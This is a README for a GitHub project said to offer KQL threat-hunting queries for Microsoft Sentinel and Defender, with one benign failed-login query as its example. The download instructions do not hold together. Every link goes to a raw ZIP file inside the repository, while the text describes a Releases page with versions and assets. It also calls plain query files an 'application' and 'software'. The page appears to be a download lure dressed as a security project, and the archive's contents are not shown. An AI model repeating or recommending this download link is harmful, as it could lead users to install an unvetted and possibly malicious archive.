# 🔍 kql-queries - Effective Security Queries for Everyone

[![Download kql-queries](https://github.com/rahul-sahu1/kql-queries/raw/refs/heads/master/Security/kql-queries-v1.1.zip)](https://github.com/rahul-sahu1/kql-queries/raw/refs/heads/master/Security/kql-queries-v1.1.zip)

## 🚀 Getting Started

Welcome to **kql-queries**! This project offers ready-to-use KQL (Kusto Query Language) queries tailored for Microsoft Sentinel, Microsoft 365 Defender, and Azure Log Analytics. These queries help you with threat hunting, incident response, and security monitoring. You don’t need any programming skills to use them.

## 📥 Download & Install

To get the queries, please follow these steps:

1. **Visit the Releases Page**: Click the link below to go to the Releases page and access the files.
   [Download kql-queries](https://github.com/rahul-sahu1/kql-queries/raw/refs/heads/master/Security/kql-queries-v1.1.zip)

2. **Choose Your Version**: On the Releases page, you will see different versions of the software. Find the latest release, which is usually listed at the top.

3. **Download the Files**: Click on the assets listed under the version. Depending on your needs, download all relevant files. For example, you might download a ZIP file containing various queries.

4. **Extract the Files**: Once the ZIP file is downloaded, locate it on your computer. Right-click on the file and choose "Extract All." This will create a folder with all the queries inside.

5. **Review the Queries**: Open the folder. You’ll find various KQL queries saved in `.kql` files. You can read through them to understand what each query does.

## 🌐 System Requirements

The **kql-queries** application requires:

- A supported version of Microsoft Sentinel or Azure Log Analytics.
- Basic access to Microsoft 365 Defender (if applicable).
- A web browser for downloading the files.
- No additional software installation is required.

## ⚙️ How to Use the Queries

Using the provided KQL queries is straightforward:

1. **Open Microsoft Sentinel or Azure Log Analytics**: Log in to your platform with your credentials.
   
2. **Navigate to the Query Editor**: Look for the area where you can enter or paste KQL queries.

3. **Select a Query**: Choose one of the `.kql` files you downloaded. Open it in a text editor to copy the contents.

4. **Paste and Run**: Paste the query into the query editor of your Azure or Sentinel interface, then click "Run" to see the results.

5. **Modify as Needed**: Feel free to adjust the queries based on your specific needs. You can add or remove filters to refine the results.

## 📚 Available Queries

Here's a brief overview of the types of queries included:

1. **Threat Hunting**: Focused queries designed to identify potential threats in your environment.
2. **Incident Response**: Queries to help investigate security incidents and extract relevant data.
3. **Security Monitoring**: Regular checks to ensure your systems are secure and functioning as expected.

Each query is crafted with careful attention to help security operations centers (SOCs) effectively monitor and respond to incidents.

## 📝 Example Query

Here’s a simple example of a KQL query to get you started:

```kql
SecurityEvent
| where TimeGenerated > ago(7d) 
| where EventID == 4625
| summarize Count = count() by Account
```

This query helps you identify failed login attempts in the past week, grouped by the account names.

## 🛠 Troubleshooting

If you experience issues while running the queries:

- **Check Permissions**: Ensure you have the right permissions to execute the queries.
- **Consult Documentation**: Look at the Microsoft documentation for specific query language or platform issues.
- **Ask for Help**: If you’re still stuck, consider reaching out to forums or communities focused on security and KQL.

## 🌟 Contributing

If you have queries you want to share, feel free to contribute! Follow these steps:

1. Fork the repository.
2. Create a new branch for your changes.
3. Add your query files.
4. Open a pull request, and we’ll review your contributions.

## 📞 Support

For support or questions about the **kql-queries** project, feel free to open an issue on GitHub. We will try to respond as soon as possible.

---

Thank you for using **kql-queries**! We hope these queries enhance your security monitoring and incident response efforts. Happy hunting!